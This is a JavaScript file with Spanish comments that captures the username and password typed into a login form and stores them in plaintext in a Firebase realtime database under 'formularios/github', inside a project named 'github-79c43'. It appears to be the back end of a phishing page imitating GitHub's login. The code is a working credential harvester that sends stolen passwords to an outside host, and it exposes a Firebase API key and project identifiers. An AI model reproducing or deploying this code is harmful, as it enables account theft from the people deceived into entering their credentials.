
// Importa la función para inicializar la aplicación de Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";

// Importa funciones necesarias para trabajar con la base de datos en tiempo real de Firebase
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-database.js";

// Configuración del proyecto de Firebase con las credenciales del proyecto
const firebaseConfig = {
  apiKey: "AIzaSyA8HbJdxHE3ajEvzDJnEZ5RYUQAwstOwPA", // Clave de API del proyecto
  authDomain: "github-79c43.firebaseapp.com", // Dominio autorizado para autenticación
  databaseURL: "https://github-79c43-default-rtdb.firebaseio.com/", // URL de la base de datos en tiempo real
  projectId: "github-79c43", // ID del proyecto en Firebase
  storageBucket: "github-79c43.appspot.com", // Almacenamiento en la nube
  messagingSenderId: "339614155051", // ID del remitente para mensajería
  appId: "1:339614155051:web:bcd69e95daae976c4ac56e", // ID único de la app
  measurementId: "G-RXFZEP8VX3" // ID para medición y analítica
};

// Inicializa la app de Firebase con la configuración anterior
const app = initializeApp(firebaseConfig);

// Obtiene la instancia de la base de datos en tiempo real
const database = getDatabase(app);

// Agrega un "escuchador" al formulario para que cuando se envíe, se ejecute una función
document.querySelector("form").addEventListener("submit", async (e) => {
  e.preventDefault(); // Previene que el formulario recargue la página al enviarse

  // Obtiene los valores ingresados por el usuario en los campos del formulario
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  try {
    // Crea una referencia en la base de datos en la ruta "formularios/github"
    const datosRef = ref(database, "formularios/github");

    // Crea un nuevo registro (ID único) dentro de esa ruta
    const nuevoRegistro = push(datosRef);

    // Almacena los datos ingresados junto con la fecha y hora actual
    await set(nuevoRegistro, {
      usuario: username,
      contrasena: password,
      fecha: new Date().toISOString() // Guarda la fecha y hora en formato ISO
    });

    // Limpia el formulario después de enviar los datos
    e.target.reset();

    // Muestra en consola que los datos se guardaron correctamente
    console.log("Datos guardados");

  } catch (error) {
    // En caso de error al guardar los datos, lo muestra en consola
    console.error("Error al guardar en Firebase:", error);
    
    // Muestra una alerta al usuario notificando del fallo técnico
    alert("Error técnico. Por favor intenta más tarde.");
  }
});
